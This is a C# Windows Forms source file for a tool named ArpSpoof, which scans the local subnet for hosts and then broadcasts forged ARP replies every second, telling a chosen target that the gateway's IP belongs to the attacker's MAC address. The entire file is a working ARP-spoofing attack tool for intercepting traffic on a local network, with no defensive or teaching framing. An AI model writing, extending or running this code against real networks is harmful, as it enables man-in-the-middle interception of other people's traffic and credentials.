using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using SharpPcap;

namespace ArpSpoof
{
    public partial class Form1 : Form
    {
        private ILiveDevice device;
        private bool isSpoofing = false;
        private PhysicalAddress sourceMac;
        private CancellationTokenSource scanCancellationTokenSource;

        public Form1()
        {
            InitializeComponent();
            LoadAdapters();
        }

        private void LoadAdapters()
        {
            var adapters = CaptureDeviceList.Instance;
            foreach (var adapter in adapters)
            {
                var networkInterface = NetworkInterface.GetAllNetworkInterfaces()
                    .FirstOrDefault(nic => nic.Id == adapter.Name.Replace("\\Device\\NPF_", ""));

                string description = networkInterface != null
                    ? $"{networkInterface.Name} ({networkInterface.Description})"
                    : adapter.Name;

                adapterComboBox.Items.Add(description);
            }

            if (adapterComboBox.Items.Count > 0)
                adapterComboBox.SelectedIndex = 0;
        }

        private async void scanButton_Click(object sender, EventArgs e)
        {
            targetComboBox.Items.Clear();
            AppendLog("Scanning network...");

            scanCancellationTokenSource = new CancellationTokenSource();
            var cancellationToken = scanCancellationTokenSource.Token;

            string localIp = GetLocalIp();
            if (string.IsNullOrEmpty(localIp))
            {
                AppendLog("Unable to retrieve local IP address.");
                return;
            }

            string subnet = localIp.Substring(0, localIp.LastIndexOf('.') + 1);

            // Run the scan in parallel, using async to handle each IP
            var tasks = Enumerable.Range(1, 254)
                .Select(i => $"{subnet}{i}")
                .Select(ip => Task.Run(() => ScanIpAsync(ip, cancellationToken), cancellationToken))
                .ToArray();

            await Task.WhenAll(tasks);
            AppendLog("Network scan completed.");
        }

        private async Task ScanIpAsync(string ip, CancellationToken cancellationToken)
        {
            try
            {
                await Task.Delay(50, cancellationToken);  // Prevents network congestion
                if (cancellationToken.IsCancellationRequested) return;

                if (SendArpRequest(ip))
                {
                    string hostname = GetHostName(ip);
                    Invoke(new Action(() => targetComboBox.Items.Add($"{ip} - {hostname}")));
                }
            }
            catch (OperationCanceledException)
            {
                AppendLog("Network scan was canceled.");
            }
            catch (Exception ex)
            {
                AppendLog($"Error scanning {ip}: {ex.Message}");
            }
        }

        private void stopScanButton_Click(object sender, EventArgs e)
        {
            scanCancellationTokenSource?.Cancel();
            AppendLog("Network scan stopped.");
        }

        // Send an ARP request to populate the ARP cache for a specific IP
        [System.Runtime.InteropServices.DllImport("iphlpapi.dll", ExactSpelling = true)]
        private static extern int SendARP(int destIp, int srcIp, byte[] macAddr, ref int physicalAddrLen);

        private bool SendArpRequest(string ipAddress)
        {
            try
            {
                IPAddress ip = IPAddress.Parse(ipAddress);
                byte[] macAddr = new byte[6];
                int length = macAddr.Length;

                int result = SendARP(BitConverter.ToInt32(ip.GetAddressBytes(), 0), 0, macAddr, ref length);

                return result == 0 && macAddr.Any(b => b != 0);
            }
            catch (Exception ex)
            {
                AppendLog($"Error sending ARP request to {ipAddress}: {ex.Message}");
                return false;
            }
        }

        private string GetLocalIp()
        {
            foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                var address = ni.GetIPProperties().UnicastAddresses
                    .FirstOrDefault(ip => ip.Address.AddressFamily == AddressFamily.InterNetwork);
                if (address != null)
                    return address.Address.ToString();
            }
            return null;
        }

        private string GetHostName(string ip)
        {
            try
            {
                return Dns.GetHostEntry(ip).HostName;
            }
            catch
            {
                return "Unknown";
            }
        }

        private async void startButton_Click(object sender, EventArgs e)
        {
            if (adapterComboBox.SelectedItem == null || targetComboBox.SelectedItem == null || string.IsNullOrEmpty(gatewayIpTextBox.Text))
            {
                AppendLog("Please select an adapter, target device, and enter the gateway IP address.");
                return;
            }

            device = CaptureDeviceList.Instance[adapterComboBox.SelectedIndex] as ILiveDevice;
            device.Open();

            sourceMac = GetMacAddress(device);
            if (sourceMac == null)
            {
                AppendLog("Failed to retrieve MAC address for the selected adapter.");
                device.Close();
                return;
            }

            // Retrieve target and gateway IP on the UI thread
            string targetIp = targetComboBox.SelectedItem.ToString().Split(' ')[0];
            string gatewayIp = gatewayIpTextBox.Text;

            isSpoofing = true;
            AppendLog("Started ARP spoofing.");

            // Pass targetIp and gatewayIp to the spoofing task
            await Task.Run(() => StartSpoofing(targetIp, gatewayIp));
        }

        private PhysicalAddress GetMacAddress(ICaptureDevice selectedDevice)
        {
            var deviceIp = GetLocalIp();

            foreach (var nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                var ipProps = nic.GetIPProperties().UnicastAddresses;
                foreach (var addr in ipProps)
                {
                    if (addr.Address.ToString() == deviceIp && nic.GetPhysicalAddress() != null)
                    {
                        return nic.GetPhysicalAddress();
                    }
                }
            }
            return null;
        }

        private void StartSpoofing(string targetIp, string gatewayIp)
        {
            try
            {
                while (isSpoofing)
                {
                    var arpPacket = BuildArpPacket(targetIp, gatewayIp);
                    device.SendPacket(arpPacket);
                    Thread.Sleep(1000);
                }
            }
            catch (Exception ex)
            {
                Invoke(new Action(() => AppendLog($"Error during spoofing: {ex.Message}")));
            }
        }


        // Modify BuildArpPacket to accept targetIp and gatewayIp as parameters
        private byte[] BuildArpPacket(string targetIp, string gatewayIp)
        {
            byte[] packet = new byte[42];
            var targetMac = PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF").GetAddressBytes();
            Array.Copy(targetMac, 0, packet, 0, 6);
            Array.Copy(sourceMac.GetAddressBytes(), 0, packet, 6, 6);
            packet[12] = 0x08; packet[13] = 0x06;

            packet[14] = 0x00; packet[15] = 0x01;
            packet[16] = 0x08; packet[17] = 0x00;
            packet[18] = 0x06; packet[19] = 0x04;
            packet[20] = 0x00; packet[21] = 0x02;

            Array.Copy(sourceMac.GetAddressBytes(), 0, packet, 22, 6);
            Array.Copy(IPAddress.Parse(gatewayIp).GetAddressBytes(), 0, packet, 28, 4);

            Array.Copy(targetMac, 0, packet, 32, 6);
            Array.Copy(IPAddress.Parse(targetIp).GetAddressBytes(), 0, packet, 38, 4);

            return packet;
        }

        private void stopButton_Click(object sender, EventArgs e)
        {
            isSpoofing = false;
            device?.Close();
            AppendLog("Stopped ARP spoofing.");
        }

        private void AppendLog(string message)
        {
            if (logTextBox.InvokeRequired)
            {
                logTextBox.Invoke(new Action(() =>
                {
                    logTextBox.AppendText($"{message}{Environment.NewLine}");
                    logTextBox.ScrollToCaret();
                }));
            }
            else
            {
                logTextBox.AppendText($"{message}{Environment.NewLine}");
                logTextBox.ScrollToCaret();
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            isSpoofing = false;
            device?.Close();
            scanCancellationTokenSource?.Cancel();
            base.OnFormClosing(e);
        }
    }
}
